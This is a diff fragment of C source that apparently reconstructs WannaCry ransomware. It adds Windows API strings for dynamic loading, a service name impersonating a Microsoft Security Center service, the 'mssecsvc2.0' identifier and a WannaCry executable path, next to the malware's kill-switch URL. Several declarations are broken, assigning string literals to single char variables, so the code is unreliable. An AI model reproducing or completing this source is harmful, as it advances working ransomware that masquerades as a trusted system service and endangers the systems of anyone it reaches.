@@ -3,6 +3,20 @@
 #include <string.h>
 #include <stdlib.h>
 
+// arguments to GetProcAddress
+char CreateProcessA_str[] = "CreateProcessA";
+char CreateFileA_str[] = "CreateFileA";
+char WriteFileA_str[] = "WriteFileA";
+char CloseHandle_str = "CloseHandle";
+
+
+// dinamically loadeds
+char Kernel32_dll = "kernel32.dll";
+
+// Services Dispatcher configs
+char MSC_2_0_SvcName[] = "Microsoft Security Center (2.0) Service";
+char wannacry_exe_path[260];
+char mssecsvc2_0_string[] = "mssecsvc2.0";
 char weird_url[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
 
 
